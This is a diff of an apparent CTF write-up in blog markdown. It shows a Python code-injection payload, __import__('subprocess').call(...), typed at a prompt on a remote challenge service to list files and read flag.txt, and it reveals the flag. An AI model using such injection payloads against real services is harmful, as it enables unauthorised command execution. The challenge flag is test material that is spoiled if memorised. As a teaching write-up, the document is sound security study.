@@ -22,17 +22,20 @@ rwandi
 rwandi</DIV>
 {% endccb %}
 
-So we can get shell:
+So we can get shell simply with:
+```py
+__import__("subprocess").call()
+```
 
 {% ccb html:true terminal:true %}
 <DIV><SPAN STYLE="color:#98C379;">┌──(</SPAN><SPAN STYLE="color:#61AFEF;">suwandi㉿ryan</SPAN><SPAN STYLE="color:#98C379;">)-[</SPAN>~/ctf/nightmare/Stack_Buffer_Overflow<SPAN STYLE="color:#98C379;">]
 └─</SPAN><SPAN STYLE="color:#61AFEF;">$</SPAN> nc 188.166.197.31 30007
 Print what? rwandi
-How many times? __import__("subprocess").call(["ls","-l"])
+How many times? <span class="code-highlight">__import__("subprocess").call(["ls","-l"])</span>
 total 8
--rw-r--r-- 1 root root  45 Dec  2 06:54 flag.txt
+<span class="code-highlight">-rw-r--r-- 1 root root  45 Dec  2 06:54 flag.txt</span>
 -rwxr-xr-x 1 root root 267 Dec  2 06:54 run
 Print what? rwandi
-How many times? __import__("subprocess").call(["cat","flag.txt"])
-blahaj{0uT_w17h_th3_N3W_4Nd_1N_w1tH_the_Old}</DIV>
+How many times? <span class="code-highlight">__import__("subprocess").call(["cat","flag.txt"])</span>
+<span class="diff-highlight-add">blahaj{0uT_w17h_th3_N3W_4Nd_1N_w1tH_the_Old}</span></DIV>
 {% endccb %}
